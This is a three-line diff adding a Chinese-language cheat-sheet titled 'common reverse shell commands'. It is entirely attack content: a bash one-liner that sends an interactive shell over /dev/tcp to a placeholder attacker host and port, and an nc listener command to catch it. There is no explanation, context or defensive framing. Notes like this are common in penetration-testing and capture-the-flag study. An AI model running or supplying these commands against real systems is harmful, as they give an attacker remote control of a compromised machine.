@@ -1,0 +1,3 @@
+反弹shell常用命令：
+/bin/bash -i >& /dev/tcp/<自己主机ip>/<监听端口> 0>&1
+nc -lvnp <监听端口>
